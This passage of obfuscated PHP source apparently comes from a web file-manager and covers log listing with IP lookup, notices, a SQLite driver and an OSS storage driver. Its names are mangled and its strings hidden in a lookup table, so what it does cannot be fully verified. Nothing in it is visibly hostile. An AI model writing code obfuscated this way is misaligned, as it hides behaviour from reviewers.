$ğŠ²óñ[$¶â¬ˆİ¬[43]] = array($¶â¬ˆİ¬[17], $Ä—½§ƒ“); } } else { $ğŠ²óñ[$¶â¬ˆİ¬[43]] = array($¶â¬ˆİ¬[2317], $¶â¬ˆİ¬[2318]); } if (!empty($ÎÅÛ…¼[$¶â¬ˆİ¬[2316]])) { $ğŠ²óñ[$¶â¬ˆİ¬[505]] = array($¶â¬ˆİ¬[438], "\45{$ÎÅÛ…¼[$¶â¬ˆİ¬[2316]]}\x25"); } $ó•´™óŸ = $this->_makeOrder()->where($ğŠ²óñ)->selectPage(); if (empty($ó•´™óŸ[$¶â¬ˆİ¬[424]])) { show_json(array(), !0, $ó•´™óŸ[$¶â¬ˆİ¬[421]]); } $ó•´™óŸ[$¶â¬ˆİ¬[424]] = $this->logList($ó•´™óŸ[$¶â¬ˆİ¬[424]]); return $ó•´™óŸ; } private function ipAddress(&$³ ¸­í´) { $£¸é¹ÔĞ =& $_SERVER[•€áå–Õ]; if (!empty($³ ¸­í´[$£¸é¹ÔĞ[2316]])) { $¾Šş¹ÂÃ = IpLocation::get($³ ¸­í´[$£¸é¹ÔĞ[2316]]); } else { $¾Šş¹ÂÃ = LNG($£¸é¹ÔĞ[2319]); } $³ ¸­í´[$£¸é¹ÔĞ[2320]] = $¾Šş¹ÂÃ; } private function descZipDownload($æË ’°›, &$©ˆ³‰) { $€¥üÀƒ‡ =& $_SERVER[•€áå–Õ]; if (!isset($æË ’°›[$€¥üÀƒ‡[2321]])) { return; } $¨£åæ„ú = json_decode($æË ’°›[$€¥üÀƒ‡[2321]], !0); foreach ($¨£åæ„ú as $¨ÓŒ£Û) { try { $óñ®— = IO::infoFullSimple($¨ÓŒ£Û[$€¥üÀƒ‡[96]]); } catch (Exception $ãå­àÖ) { continue; } $æË ’°›[$€¥üÀƒ‡[96]] = $¨ÓŒ£Û[$€¥üÀƒ‡[96]]; $©ˆ³‰[] = $æË ’°›[$€¥üÀƒ‡[193]] = $óñ®—[$€¥üÀƒ‡[193]]; $©ˆ³‰[] = $æË ’°›[$€¥üÀƒ‡[2120]] = $óñ®—[$€¥üÀƒ‡[192]]; break; } return $æË ’°›; } private function getSourceList(&$›†ö¤å¿) { $Ì¤åõà =& $_SERVER[•€áå–Õ]; $åş¸ƒş = array(); foreach ($›†ö¤å¿ as $í±ò— => $ñéªÖã­) { $—‰æÏÌ = json_decode($ñéªÖã­[$Ì¤åõà[505]], !0); if ($ñéªÖã­[$Ì¤åõà[43]] == $Ì¤åõà[1865]) { $—‰æÏÌ = $this->descZipDownload($—‰æÏÌ, $åş¸ƒş); $›†ö¤å¿[$í±ò—][$Ì¤åõà[505]] = json_encode($—‰æÏÌ); continue; } if (strpos($ñéªÖã­[$Ì¤åõà[43]], $Ì¤åõà[2122]) !== 0) { if (!isset($—‰æÏÌ[$Ì¤åõà[96]]) || strpos($ñéªÖã­[$Ì¤åõà[43]], $Ì¤åõà[2322]) !== 0) { continue; } try { $­ˆáÅÎ÷ = IO::infoFullSimple($—‰æÏÌ[$Ì¤åõà[96]]); } catch (Exception $¤¯‰Á‰®) { continue; } $åş¸ƒş[] = $—‰æÏÌ[$Ì¤åõà[193]] = $­ˆáÅÎ÷[$Ì¤åõà[193]]; $åş¸ƒş[] = $—‰æÏÌ[$Ì¤åõà[2120]] = $­ˆáÅÎ÷[$Ì¤åõà[192]]; $›†ö¤å¿[$í±ò—][$Ì¤åõà[505]] = json_encode($—‰æÏÌ); continue; } $åş¸ƒş[] = $—‰æÏÌ[$Ì¤åõà[193]]; $åş¸ƒş[] = $—‰æÏÌ[$Ì¤åõà[2120]]; if ($—‰æÏÌ[$Ì¤åõà[43]] == $Ì¤åõà[599]) { $åş¸ƒş[] = $—‰æÏÌ[$Ì¤åõà[505]][$Ì¤åõà[1201]]; $åş¸ƒş[] = $—‰æÏÌ[$Ì¤åõà[505]][$Ì¤åõà[1202]]; } if ($—‰æÏÌ[$Ì¤åõà[43]] == $Ì¤åõà[2130]) { $åş¸ƒş[] = $—‰æÏÌ[$Ì¤åõà[505]][$Ì¤åõà[193]]; } } if (!$åş¸ƒş) { return array(); } return Model($Ì¤åõà[866])->sourceListInfo($åş¸ƒş, !0); } private function logList($ã°¶Å±) { $†è˜° =& $_SERVER[•€áå–Õ]; $«ˆ–ê° = array_to_keyvalue($ã°¶Å±, $†è˜°[22], $†è˜°[1693]); $êµı²Ú¶ = Model($†è˜°[578])->userListInfo(array_unique($«ˆ–ê°)); $›Øâ‡íŒ = $this->getSourceList($ã°¶Å±); $ûÔ ¿í = $this->typeAll(); $±Èè‡ë = array(); $Í¤¨©ˆÜ = array(); foreach ($ã°¶Å± as $ñ˜­Äó => $İÑóÜú±) { $¬‰¤™Øá = $İÑóÜú±[$†è˜°[43]]; $Üã¶ƒßƒ = isset($êµı²Ú¶[$İÑóÜú±[$†è˜°[1693]]]) ? $êµı²Ú¶[$İÑóÜú±[$†è˜°[1693]]] : !1; $ÅïÈİª = strpos($¬‰¤™Øá, $†è˜°[2323]) === 0 ? LNG($†è˜°[2324]) : LNG($†è˜°[2319]); $İÑóÜú±[$†è˜°[42]] = isset($Üã¶ƒßƒ[$†è˜°[42]]) ? $Üã¶ƒßƒ[$†è˜°[42]] : LNG($†è˜°[2319]); $İÑóÜú±[$†è˜°[2174]] = isset($Üã¶ƒßƒ[$†è˜°[2174]]) ? $Üã¶ƒßƒ[$†è˜°[2174]] : $†è˜°[22]; $İÑóÜú±[$†è˜°[1583]] = isset($ûÔ ¿í[$¬‰¤™Øá]) ? $ûÔ ¿í[$¬‰¤™Øá] : $ÅïÈİª; $İÑóÜú±[$†è˜°[2063]] = $Üã¶ƒßƒ; $îµÇïĞ¯ = json_decode($İÑóÜú±[$†è˜°[505]], !0); $İÑóÜú±[$†è˜°[2316]] = isset($îµÇïĞ¯[$†è˜°[2316]]) ? $îµÇïĞ¯[$†è˜°[2316]] : $†è˜°[22]; $İÑóÜú±[$†è˜°[2320]] = IpLocation::get($İÑóÜú±[$†è˜°[2316]]); if (strpos($¬‰¤™Øá, $†è˜°[2122]) === 0 || isset($îµÇïĞ¯[$†è˜°[2120]])) { $îµÇïĞ¯[$†è˜°[99]] = $›Øâ‡íŒ[$îµÇïĞ¯[$†è˜°[193]]]; $îµÇïĞ¯[$†è˜°[2135]] = $›Øâ‡íŒ[$îµÇïĞ¯[$†è˜°[2120]]]; if ($îµÇïĞ¯[$†è˜°[43]] == $†è˜°[599]) { $îµÇïĞ¯[$†è˜°[505]][$†è˜°[1201]] = $›Øâ‡íŒ[$îµÇïĞ¯[$†è˜°[505]][$†è˜°[1201]]]; $îµÇïĞ¯[$†è˜°[505]][$†è˜°[1202]] = $›Øâ‡íŒ[$îµÇïĞ¯[$†è˜°[505]][$†è˜°[1202]]]; } if ($îµÇïĞ¯[$†è˜°[43]] == $†è˜°[2130]) { $îµÇïĞ¯[$†è˜°[505]][$†è˜°[193]] = $›Øâ‡íŒ[$îµÇïĞ¯[$†è˜°[505]][$†è˜°[193]]]; } if ($îµÇïĞ¯[$†è˜°[43]] == $†è˜°[1860]) { $îµÇïĞ¯[$†è˜°[2135]] = $îµÇïĞ¯[$†è˜°[99]]; $îµÇïĞ¯[$†è˜°[2120]] = $îµÇïĞ¯[$†è˜°[2135]][$†è˜°[193]]; $îµÇïĞ¯[$†è˜°[99]] = !1; $îµÇïĞ¯[$†è˜°[193]] = $†è˜°[22]; } if ($îµÇïĞ¯[$†è˜°[99]] && $îµÇïĞ¯[$†è˜°[99]][$†è˜°[190]] == $†è˜°[191]) { $Í¤¨©ˆÜ[] = $İÑóÜú±[$†è˜°[454]]; unset($ã°¶Å±[$ñ˜­Äó]); continue; } if ($îµÇïĞ¯[$†è˜°[2135]] && $îµÇïĞ¯[$†è˜°[2135]][$†è˜°[190]] == $†è˜°[191]) { $Í¤¨©ˆÜ[] = $İÑóÜú±[$†è˜°[454]]; unset($ã°¶Å±[$ñ˜­Äó]); continue; } } $İÑóÜú±[$†è˜°[505]] = $îµÇïĞ¯; unset($İÑóÜú±[$†è˜°[2325]]); $±Èè‡ë[] = $İÑóÜú±; } $this->clearSystemPathLog($Í¤¨©ˆÜ); return $±Èè‡ë; } private function clearSystemPathLog($éşó¸é˜) { $í„¾Ïòà =& $_SERVER[•€áå–Õ]; if (count($éşó¸é˜) == 0) { return; } $½Ş˜èÑ” = array($í„¾Ïòà[454] => array($í„¾Ïòà[17], array_unique($éşó¸é˜))); $this->where($½Ş˜èÑ”)->delete(); } public function deviceList($‰Ì•ÃÕ, $ùšõ¸±… = 0) { $–‚Çë•Å =& $_SERVER[•€áå–Õ]; $éŸ©´á = array($–‚Çë•Å[1693] => $‰Ì•ÃÕ, $–‚Çë•Å[227] => array($–‚Çë•Å[1055], $ùšõ¸±…), $–‚Çë•Å[43] => $–‚Çë•Å[1834]); $ß€³¢– = array(); $Ïàıú»¼ = $this->field($–‚Çë•Å[2326])->where($éŸ©´á)->order($–‚Çë•Å[2133])->limit(50)->select(); foreach ($Ïàıú»¼ as $‘Òğ‚–µ => $ûœíÊ ) { if ($‘Òğ‚–µ > 0 && abs($ûœíÊ [$–‚Çë•Å[227]] - $Ïàıú»¼[$‘Òğ‚–µ - 1][$–‚Çë•Å[227]]) < 5) { continue; } $˜ß™û‹ƒ = json_decode($ûœíÊ [$–‚Çë•Å[505]], !0); $ûœíÊ [$–‚Çë•Å[2316]] = isset($˜ß™û‹ƒ[$–‚Çë•Å[2316]]) ? $˜ß™û‹ƒ[$–‚Çë•Å[2316]] : $–‚Çë•Å[22]; unset($˜ß™û‹ƒ[$–‚Çë•Å[2316]]); $¬ôç’…Á = $this->deviceType($˜ß™û‹ƒ[$–‚Çë•Å[2123]]); if (isset($ß€³¢–[$¬ôç’…Á])) { continue; } $ûœíÊ [$–‚Çë•Å[2320]] = IpLocation::get($ûœíÊ [$–‚Çë•Å[2316]]); $ûœíÊ [$–‚Çë•Å[505]] = $˜ß™û‹ƒ; $ß€³¢–[$¬ôç’…Á] = $ûœíÊ ; } return array_values($ß€³¢–); } public function deviceType($æúˆŸù„) { return $æúˆŸù„; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x6e\157\164\151\x63\145\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\x63\x6f\x6e\164\x65\156\164", "\x61\x75\x74\x68", "\x6d\157\144\145", "\x74\x69\155\145", "\x74\171\x70\145", "\x6c\x65\166\x65\x6c", "\145\x6e\x61\142\x6c\x65", "\163\x6f\162\x74"); public function listData($®±Ü–×» = false, $ò”€³ğÑ = "\163\x6f\x72\164", $İÙòÏÃÓ = false) { return parent::listData($®±Ü–×», $ò”€³ğÑ, $İÙòÏÃÓ); } public function add($úÀ÷Ä¯†) { $’éäĞÑÜ =& $_SERVER[•€áå–Õ]; $ôÑÛı… = time(); if ($úÀ÷Ä¯†[$’éäĞÑÜ[26]] == $’éäĞÑÜ[2327]) { $ôÑÛı… = strtotime($úÀ÷Ä¯†[$’éäĞÑÜ[206]]); } $úÀ÷Ä¯†[$’éäĞÑÜ[206]] = $ôÑÛı…; return parent::insert($úÀ÷Ä¯†); } public function update($Å©‡Ä‡€, $ÌÎìÖà¨) { $„ÁŞæÉ =& $_SERVER[•€áå–Õ]; $ÛÆÂ±Ó» = $this->listData($Å©‡Ä‡€); if (!$ÛÆÂ±Ó») { return !1; } $É€äĞª = time(); if ($ÌÎìÖà¨[$„ÁŞæÉ[26]] == $„ÁŞæÉ[2327]) { $É€äĞª = strtotime($ÌÎìÖà¨[$„ÁŞæÉ[206]]); } $ÌÎìÖà¨[$„ÁŞæÉ[206]] = $É€äĞª; return parent::update($Å©‡Ä‡€, $ÌÎìÖà¨); } public function remove($€Ş‹Ş·¾) { $‹ÇØœÛó = $this->listData($€Ş‹Ş·¾); if (!$‹ÇØœÛó || $‹ÇØœÛó[$_SERVER[•€áå–Õ][191]]) { return !1; } return parent::remove($€Ş‹Ş·¾); } public function sort($±úïêìÊ, $¼šÂŒûµ) { return parent::update($±úïêìÊ, $¼šÂŒûµ); } public function enable($âºÊ‡, $¥ä€Şôø) { return parent::update($âºÊ‡, array($_SERVER[•€áå–Õ][2328] => $¥ä€Şôø)); } private function initUserOption() { $•±¯…¢Ù =& $_SERVER[•€áå–Õ]; $this->optionType = $•±¯…¢Ù[2329]; $this->modelType = $•±¯…¢Ù[2330]; $this->field = array($•±¯…¢Ù[2331], $•±¯…¢Ù[42], $•±¯…¢Ù[206], $•±¯…¢Ù[43], $•±¯…¢Ù[2332], $•±¯…¢Ù[791], $•±¯…¢Ù[222]); } public function userNoticeGet($Œş®Õ² = false) { $this->initUserOption(); return parent::listData($Œş®Õ², $_SERVER[•€áå–Õ][454], !0); } public function userNoticeAdd($ˆÚçäß) { $¶Ä³ñú‚ =& $_SERVER[•€áå–Õ]; $this->initUserOption(); $ÑÕšÑŞ = $this->findByKey($¶Ä³ñú‚[2331], $ˆÚçäß[$¶Ä³ñú‚[454]]); if ($ÑÕšÑŞ) { return !0; } $¡£¦¡ÂÕ = array($¶Ä³ñú‚[2331] => $ˆÚçäß[$¶Ä³ñú‚[454]], $¶Ä³ñú‚[42] => $ˆÚçäß[$¶Ä³ñú‚[42]], $¶Ä³ñú‚[206] => $ˆÚçäß[$¶Ä³ñú‚[206]], $¶Ä³ñú‚[43] => isset($ˆÚçäß[$¶Ä³ñú‚[43]]) ? $ˆÚçäß[$¶Ä³ñú‚[43]] : 1, $¶Ä³ñú‚[2332] => isset($ˆÚçäß[$¶Ä³ñú‚[2332]]) ? $ˆÚçäß[$¶Ä³ñú‚[2332]] : 0, $¶Ä³ñú‚[791] => 0, $¶Ä³ñú‚[222] => 0); return parent::insert($¡£¦¡ÂÕ); } public function userNoticeEdit($Ãòñ–ãä, $ãÏ…¥„ò) { $this->initUserOption(); return parent::update($Ãòñ–ãä, $ãÏ…¥„ò); } } goto fì³”‰Ğ’; B¦¯Ã¯¶†Œ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¤›››®µ =& $_SERVER[•€áå–Õ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¤›››®µ[16]] =& $config; $this->values[$¤›››®µ[17]] =& $in; $this->tpl = TEMPLATE . MOD . $¤›››®µ[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($˜Ì¶¡¿) { if (1 === func_num_args()) { $this->{$˜Ì¶¡¿} = new $˜Ì¶¡¿(); } else { $‘•¬šñ“ = new ReflectionClass($˜Ì¶¡¿); $¿³€áË• = func_get_args(); array_shift($¿³€áË•); $this->{$˜Ì¶¡¿} = $‘•¬šñ“->newInstanceArgs($¿³€áË•); } return $this->{$˜Ì¶¡¿}; } public function routeBind($ıŒ­É‡š, $ö¨Î¼ığ, $İ”‰óÖ = 3) { $ß…ÊÖ´ =& $_SERVER[•€áå–Õ]; $ÕÕîìåÔ = $this->in[$ß…ÊÖ´[19]]; $ıŒ­É‡š = str_replace($ß…ÊÖ´[20], $ß…ÊÖ´[21], trim(trim($ıŒ­É‡š, $ß…ÊÖ´[18]), $ß…ÊÖ´[22])); if (!$ıŒ­É‡š || count($ÕÕîìåÔ) <= $İ”‰óÖ) { return !1; } $ÅÖâ€¾Á = !0; $ ¶–§÷ = explode($ß…ÊÖ´[18], $ıŒ­É‡š); for ($¦ı‰êÆ = 0; $¦ı‰êÆ < count($ ¶–§÷); $¦ı‰êÆ++) { if ($ ¶–§÷[$¦ı‰êÆ] != $ÕÕîìåÔ[$İ”‰óÖ + $¦ı‰êÆ]) { $ÅÖâ€¾Á = !1; break; } } if (!$ÅÖâ€¾Á) { return; } call_user_func_array(array($this, $ö¨Î¼ığ), array()); } public function routeArgs($×ÀÌŸŠÚ = 3) { $î¯”€õ = $this->in[$_SERVER[•€áå–Õ][19]]; if (count($î¯”€õ) <= $×ÀÌŸŠÚ) { return array(); } $Üóá•² = array(); for ($¸ŞÅ¢ = $×ÀÌŸŠÚ; $¸ŞÅ¢ < count($î¯”€õ); $¸ŞÅ¢ += 2) { $Üóá•²[$î¯”€õ[$¸ŞÅ¢]] = $î¯”€õ[$¸ŞÅ¢ + 1]; $this->in[$î¯”€õ[$¸ŞÅ¢]] = $î¯”€õ[$¸ŞÅ¢ + 1]; } return $Üóá•²; } protected function assign($×úûÇá», $Ù‚ëöÎş) { $this->values[$×úûÇá»] = $Ù‚ëöÎş; } protected function display($¡ôÑÑ£) { ob_end_clean(); extract($this->values); require $this->tpl . $¡ôÑÑ£; } } class DbSqliteBase extends Db { public function __construct($Ÿ÷™‘Ï = '') { $·ÍçÍ’ƒ =& $_SERVER[•€áå–Õ]; if (!extension_loaded($·ÍçÍ’ƒ[23])) { think_exception(think_lang($·ÍçÍ’ƒ[24]) . $·ÍçÍ’ƒ[25]); } if (!empty($Ÿ÷™‘Ï)) { if (!isset($Ÿ÷™‘Ï[$·ÍçÍ’ƒ[26]])) { $Ÿ÷™‘Ï[$·ÍçÍ’ƒ[26]] = 438; } $this->config = $Ÿ÷™‘Ï; if (empty($this->config[$·ÍçÍ’ƒ[27]])) { $this->config[$·ÍçÍ’ƒ[27]] = array(); } } } public function connect($ï˜Ä¯ó¯ = '', $ä–¢×Ò = 0) { $ç”Ö¹©à =& $_SERVER[•€áå–Õ]; if (!isset($this->linkID[$ä–¢×Ò])) { if (empty($ï˜Ä¯ó¯)) { $ï˜Ä¯ó¯ = $this->config; } $Õ‘èûõı = !empty($ï˜Ä¯ó¯[$ç”Ö¹©à[27]][$ç”Ö¹©à[28]]) ? $ï˜Ä¯ó¯[$ç”Ö¹©à[27]][$ç”Ö¹©à[28]] : $this->pconnect; $öş–îşë = $Õ‘èûõı ? $ç”Ö¹©à[29] : $ç”Ö¹©à[30]; $this->linkID[$ä–¢×Ò] = $öş–îşë($ï˜Ä¯ó¯[$ç”Ö¹©à[31]], $ï˜Ä¯ó¯[$ç”Ö¹©à[26]]); if (!$this->linkID[$ä–¢×Ò]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ä–¢×Ò], 30000); if (1 != think_config($ç”Ö¹©à[32])) { unset($this->config); } } return $this->linkID[$ä–¢×Ò]; } public function free() { $this->queryID = null; } public function query($ÕÌûºÁ) { $±Å³ÍîÏ =& $_SERVER[•€áå–Õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÕÌûºÁ; if ($this->queryID) { $this->free(); } think_action_status($±Å³ÍîÏ[33], 1); think_status($±Å³ÍîÏ[34]); $this->queryID = sqlite_query($this->_linkID, $ÕÌûºÁ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ø×œ€´ = $this->getAll(); return $ø×œ€´; } } public function execute($ãİ¯×„İ) { $üœ º­Ø =& $_SERVER[•€áå–Õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ãİ¯×„İ; if ($this->queryID) { $this->free(); } think_action_status($üœ º­Ø[35], 1); think_status($üœ º­Ø[34]); $É•´· = sqlite_exec($this->_linkID, $ãİ¯×„İ); $this->debug(); if (!1 === $É•´·) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[•€áå–Õ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $î¼ø¿‡Ó = sqlite_query($this->_linkID, $_SERVER[•€áå–Õ][37]); if (!$î¼ø¿‡Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢ãğ›àË = sqlite_query($this->_linkID, $_SERVER[•€áå–Õ][38]); if (!$¢ãğ›àË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¹¾«©ê„ = array(); if ($this->numRows > 0) { for ($Úíªëù = 0; $Úíªëù < $this->numRows; $Úíªëù++) { $¹¾«©ê„[$Úíªëù] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¹¾«©ê„; } public function getFields($„¯á÷˜) { $öÃ„ãª =& $_SERVER[•€áå–Õ]; $™·§Š‹ = $this->query($öÃ„ãª[39] . $„¯á÷˜ . $öÃ„ãª[40]); $’»‡ê¹ = array(); if ($™·§Š‹) { foreach ($™·§Š‹ as $¼™å¦›˜ => $êÈ ¨ÊØ) { $’»‡ê¹[$êÈ ¨ÊØ[$öÃ„ãª[41]]] = array($öÃ„ãª[42] => $êÈ ¨ÊØ[$öÃ„ãª[41]], $öÃ„ãª[43] => $êÈ ¨ÊØ[$öÃ„ãª[44]], $öÃ„ãª[45] => (bool) ($êÈ ¨ÊØ[$öÃ„ãª[46]] === $öÃ„ãª[22]), $öÃ„ãª[47] => $êÈ ¨ÊØ[$öÃ„ãª[48]], $öÃ„ãª[49] => strtolower($êÈ ¨ÊØ[$öÃ„ãª[50]]) == $öÃ„ãª[51], $öÃ„ãª[52] => strtolower($êÈ ¨ÊØ[$öÃ„ãª[53]]) == $öÃ„ãª[54]); } } return $’»‡ê¹; } public function getTables($„úş´’È = '') { $Ô…¬ƒÔ– =& $_SERVER[•€áå–Õ]; $Öå³Ã·û = $this->query($Ô…¬ƒÔ–[55] . $Ô…¬ƒÔ–[56] . $Ô…¬ƒÔ–[57]); $óà²ªıô = array(); foreach ($Öå³Ã·û as $ÃÙÔËöÜ => $ñıÁíÄ) { $óà²ªıô[$ÃÙÔËöÜ] = current($ñıÁíÄ); } return $óà²ªıô; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ø‚ûâÜ§ =& $_SERVER[•€áå–Õ]; $öÉãÅ˜Â = sqlite_last_error($this->_linkID); $this->error = $öÉãÅ˜Â . $ø‚ûâÜ§[4] . sqlite_error_string($öÉãÅ˜Â); if ($ø‚ûâÜ§[22] != $this->queryStr) { $this->error .= LNG($ø‚ûâÜ§[58]) . $this->queryStr; } think_trace($this->error, $ø‚ûâÜ§[22], $ø‚ûâÜ§[59]); return $this->error; } public function escapeString($â­Ñ©Ê) { return sqlite_escape_string($â­Ñ©Ê); } public function parseLimit($Ãåû´Ú¦) { $¨­¦ÛŠÎ =& $_SERVER[•€áå–Õ]; $¤Ô§”ªª = $¨­¦ÛŠÎ[22]; if (!empty($Ãåû´Ú¦)) { $Ãåû´Ú¦ = explode($¨­¦ÛŠÎ[60], $Ãåû´Ú¦); if (count($Ãåû´Ú¦) > 1) { $¤Ô§”ªª .= $¨­¦ÛŠÎ[61] . $Ãåû´Ú¦[1] . $¨­¦ÛŠÎ[62] . $Ãåû´Ú¦[0] . $¨­¦ÛŠÎ[63]; } else { $¤Ô§”ªª .= $¨­¦ÛŠÎ[61] . $Ãåû´Ú¦[0] . $¨­¦ÛŠÎ[63]; } } return $¤Ô§”ªª; } } $_file = $_SERVER[$_SERVER[•€áå–Õ][6]]; goto A×´˜ô¤™ï; D×»Ï¯ëñÑ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($“ôÉ¨ª) { parent::__construct(); include_once SDK_DIR . $_SERVER[•€áå–Õ][1412]; $this->_init($“ôÉ¨ª); } public function _init($øÓ½–ª) { $íœÉİÉá =& $_SERVER[•€áå–Õ]; $this->config = $øÓ½–ª; foreach ($øÓ½–ª as $…áÚô„ => $’Æâ•Í‘) { if (isset($this->{$…áÚô„})) { $this->{$…áÚô„} = $’Æâ•Í‘; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($íœÉİÉá[1413] . LNG($íœÉİÉá[1414])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Æúâ¢îÌ =& $_SERVER[•€áå–Õ]; $®š‡Éõ£ = new OSS\Model\CorsConfig(); $ËÊÀí½ô = new OSS\Model\CorsRule(); $ËÊÀí½ô->addAllowedOrigin($Æúâ¢îÌ[1415]); $ËÊÀí½ô->addAllowedMethod($Æúâ¢îÌ[1416]); $ËÊÀí½ô->addAllowedMethod($Æúâ¢îÌ[1417]); $ËÊÀí½ô->addAllowedMethod($Æúâ¢îÌ[1418]); $ËÊÀí½ô->addAllowedMethod($Æúâ¢îÌ[1419]); $ËÊÀí½ô->addAllowedMethod($Æúâ¢îÌ[173]); $ËÊÀí½ô->setMaxAgeSeconds(600); $ËÊÀí½ô->addExposeHeader($Æúâ¢îÌ[1420]); $ËÊÀí½ô->addAllowedHeader($Æúâ¢îÌ[1415]); $®š‡Éõ£->addRule($ËÊÀí½ô); try { $this->client->putBucketCors($this->bucket, $®š‡Éõ£); } catch (OSS\Core\OssException $ÉºâÈ¸ç) { return !1; } return !0; } public function getBucketCors() { $µÁøâ¾ =& $_SERVER[•€áå–Õ]; $êÂ ¤ª¼ = null; try { $êÂ ¤ª¼ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¢å–Ç’×) { return null; } if (!$êÂ ¤ª¼ || !($Î¦øµÔ = $êÂ ¤ª¼->getRules())) { return null; } $¥”Îş‡ = $Î¦øµÔ[0]->getAllowedOrigins(); $¡¶ÎÉÕÔ = $Î¦øµÔ[0]->getAllowedMethods(); $±ãû–Ğ¥ = $Î¦øµÔ[0]->getMaxAgeSeconds(); $Çë¼ªú² = $Î¦øµÔ[0]->getExposeHeaders(); $¼òİÏ£ = $Î¦øµÔ[0]->getAllowedHeaders(); return array($µÁøâ¾[214] => isset($¥”Îş‡[0]) ? $¥”Îş‡[0] : $µÁøâ¾[22], $µÁøâ¾[218] => $¡¶ÎÉÕÔ, $µÁøâ¾[1421] => $±ãû–Ğ¥, $µÁøâ¾[1422] => isset($Çë¼ªú²[0]) ? $Çë¼ªú²[0] : $µÁøâ¾[22], $µÁøâ¾[216] => isset($¼òİÏ£[0]) ? $¼òİÏ£[0] : $µÁøâ¾[22]); } public function isBucketCors() { $îŒÊ¬ß =& $_SERVER[•€áå–Õ]; $ÊƒÁÌÜ = $this->getBucketCors(); if (!$ÊƒÁÌÜ || !is_array($ÊƒÁÌÜ)) { return !1; } if ($ÊƒÁÌÜ[$îŒÊ¬ß[214]] != $îŒÊ¬ß[215] || $ÊƒÁÌÜ[$îŒÊ¬ß[216]] != $îŒÊ¬ß[215]) { return !1; } $ğ«­Ùßş = array_map($îŒÊ¬ß[217], $ÊƒÁÌÜ[$îŒÊ¬ß[218]]); if (!is_array($ğ«­Ùßş)) { $ğ«­Ùßş = array(); } $’Ş–ñœ© = array($îŒÊ¬ß[219], $îŒÊ¬ß[220], $îŒÊ¬ß[221], $îŒÊ¬ß[222], $îŒÊ¬ß[223]); $Ÿ«èË£  = array_diff($’Ş–ñœ©, $ğ«­Ùßş); return empty($Ÿ«èË£ ); } public function mkfile($‡»Âó, $ÙıÑã± = '', $°úÁ¥à = REPEAT_RENAME) { $‡À‚íßÆ = $this->setContent($‡»Âó, $ÙıÑã±); if ($‡À‚íßÆ !== !1) { return $this->getPathOuter($‡»Âó); } return !1; } public function mkdir($´¸èÚ•š, $©ñ“³« = REPEAT_SKIP) { if ($©ñ“³« && $this->_isFolder($´¸èÚ•š)) { return $this->getPathOuter($´¸èÚ•š); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($´¸èÚ•š)); } catch (OSS\Core\OssException $ãÕÚ¨°«) { return !1; } return $this->getPathOuter($´¸èÚ•š); } private function fileList($Â¬áâß², $è¿ô°ç‚ = '', $±Ñ•“ŒÊ = 0) { $›–ĞÙé =& $_SERVER[•€áå–Õ]; $Â¬áâß² = trim($Â¬áâß², $›–ĞÙé[18]); $À±ù¤ô = empty($Â¬áâß²) && $Â¬áâß² !== $›–ĞÙé[224] ? $›–ĞÙé[22] : $Â¬áâß² . $›–ĞÙé[18]; $Ğª‚Ğ×À = $›–ĞÙé[22]; $ò¸İëğ = 1000; $çÌšİï¸ = $ÆœÆ‡ƒò = array(); while (!0) { check_abort(); $Êûş”ô¹ = array($›–ĞÙé[1423] => $è¿ô°ç‚, $›–ĞÙé[1424] => $À±ù¤ô, $›–ĞÙé[1425] => $ò¸İëğ, $›–ĞÙé[1426] => $Ğª‚Ğ×À); try { $²îï ¯´ = $this->client->listObjects($this->bucket, $Êûş”ô¹); } catch (OSS\Core\OssException $„¼ä÷Æ¥) { break; } $Ğª‚Ğ×À = $²îï ¯´->getNextMarker(); $ñÏÆ €ï = $²îï ¯´->getObjectList(); $¬şêëöÕ = $²îï ¯´->getPrefixList(); foreach ($ñÏÆ €ï as $Êµ‘„ü¥) { if ($Êµ‘„ü¥->getKey() == $À±ù¤ô) { continue; } $õª–ªıæ = $Êµ‘„ü¥->getKey(); $ùãó–œ = $Êµ‘„ü¥->getSize(); $ıèÎòæ¤ = $Êµ‘„ü¥->getLastModified(); $ÖŞ¦÷±Š = trim($Êµ‘„ü¥->getETag(), $›–ĞÙé[130]); $„Ù€ÚŸÔ = $±Ñ•“ŒÊ ? array($›–ĞÙé[42] => $õª–ªıæ, $›–ĞÙé[88] => $ùãó–œ, $›–ĞÙé[206] => strtotime($ıèÎòæ¤), $›–ĞÙé[1427] => $ÖŞ¦÷±Š) : $õª–ªıæ; $¨şÄÈÛ = $ùãó–œ == 0 && substr($õª–ªıæ, strlen($õª–ªıæ) - 1, 1) == $›–ĞÙé[18] ? !0 : !1; $Ó«˜– ° = 